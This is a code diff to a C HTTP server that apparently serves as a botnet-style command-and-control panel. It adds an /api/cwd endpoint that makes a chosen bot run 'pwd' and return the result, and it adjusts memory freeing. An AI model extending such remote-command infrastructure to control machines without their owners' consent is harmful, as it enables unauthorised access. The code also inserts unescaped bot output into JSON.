@@ -173,13 +173,13 @@ void handle_send_command(struct mg_connection *c, struct mg_http_message *hm) {
     // Send the command to the client
     if (send_command(client->socket, &cmd) < 0) {
         mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send command to client\"}");
-        if (client->socket && &cmd) {
-            free_command(&cmd);
-        }
+        output_log("Failed while sending command to client\n", LOG_DEBUG, LOG_TO_CONSOLE);
+        free_command(&cmd); // Free dynamically allocated fields
         return;
     }
 
     mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"status\":\"success\"}");
+    free_command(&cmd); // Free dynamically allocated fields
 }
 
 // Function to handle server status
@@ -371,6 +371,61 @@ void handle_get_bot_file(struct mg_connection *c, struct mg_http_message *hm) {
     free(response);
 }
 
+void handle_get_cwd(struct mg_connection *c, struct mg_http_message *hm) {
+    char bot_id[256] = {0};
+
+    // Parse the bot_id from the request
+    mg_http_get_var(&hm->query, "bot_id", bot_id, sizeof(bot_id));
+
+    output_log("Getting cwd from bot %s\n", LOG_DEBUG, LOG_TO_CONSOLE, bot_id);
+
+    if (strlen(bot_id) == 0) {
+        mg_http_reply(c, 400, "Content-Type: application/json\r\n", "{\"error\":\"Bot ID is required\"}");
+        return;
+    }
+
+    // Find the target client
+    Client *client = find_client(&hash_table, bot_id);
+    if (client == NULL) {
+        mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
+        return;
+    }
+
+    // Build the `pwd` command
+    Command cmd = {
+        .cmd_id = "0",
+        .delay = 0,
+        .program = strdup("pwd"), // Dynamically allocate program
+        .expected_exit_code = 0,
+        .params = NULL // Initialize params to NULL
+    };
+
+    // Send the command to the client
+    output_log("Command built, client found - sending!\n", LOG_DEBUG, LOG_TO_CONSOLE);
+
+    if (send_command(client->socket, &cmd) < 0) {
+        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to send command to client\"}");
+        output_log("Failed while sending command to client\n", LOG_DEBUG, LOG_TO_CONSOLE);
+        free_command(&cmd); // Free dynamically allocated fields
+        return;
+    }
+
+    // Receive the response from the client
+    char buffer[1024] = {0};
+    if (receive_message_client(client->socket, buffer, sizeof(buffer)) < 0) {
+        mg_http_reply(c, 500, "Content-Type: application/json\r\n", "{\"error\":\"Failed to receive response from client\"}");
+        output_log("Failed receiving reply from client\n", LOG_DEBUG, LOG_TO_CONSOLE);
+        free_command(&cmd); // Free dynamically allocated fields
+        return;
+    }
+
+    // Send the `cwd` back to the web interface
+    mg_http_reply(c, 200, "Content-Type: application/json\r\n", "{\"cwd\":\"%s\"}", buffer);
+    output_log("CWD sent back to the server!\n", LOG_DEBUG, LOG_TO_CONSOLE);
+    free_command(&cmd); // Free dynamically allocated fields
+    output_log("Freed a valid pointer :)\n", LOG_DEBUG, LOG_TO_CONSOLE);
+}
+
 // HTTP request handler
 void handle_request(struct mg_connection *c, int ev, void *ev_data) {
     struct mg_http_message *hm = (struct mg_http_message *) ev_data;
@@ -383,6 +438,8 @@ void handle_request(struct mg_connection *c, int ev, void *ev_data) {
             handle_server_status(c, hm);
         } else if (strncmp(hm->uri.buf, "/api/botfile", hm->uri.len) == 0) {
             handle_get_bot_file(c, hm);
+        } else if (strncmp(hm->uri.buf, "/api/cwd", hm->uri.len) == 0) {
+            handle_get_cwd(c, hm);
         } else if (strncmp(hm->uri.buf, "/static/", 8) == 0) {
             serve_static_file(c, hm);
         } else {
